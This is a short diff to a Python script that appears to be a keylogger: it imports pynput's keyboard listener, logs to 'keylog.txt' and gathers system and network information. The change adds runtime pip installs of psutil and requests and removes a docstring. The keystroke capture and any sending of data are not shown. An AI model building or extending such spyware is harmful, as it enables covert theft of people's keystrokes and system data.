@@ -9,6 +9,9 @@ from datetime import datetime
 from requests import get
 from pynput.keyboard import Key, Listener
 subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
+subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil"])
+subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
+
 
 ## Initialise variables
 keys = []
@@ -20,12 +23,6 @@ logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asc
 ## Retrieving System Information + Network Information
 # Making bytes sorted
 def get_size(bytes, suffix="B"):
-    """
-    Scale bytes to its proper format
-    e.g:
-        1253656 => '1.20MB'
-        1253656678 => '1.17GB'
-    """
     factor = 1024
     for unit in ["", "K", "M", "G", "T", "P"]:
         if bytes < factor:
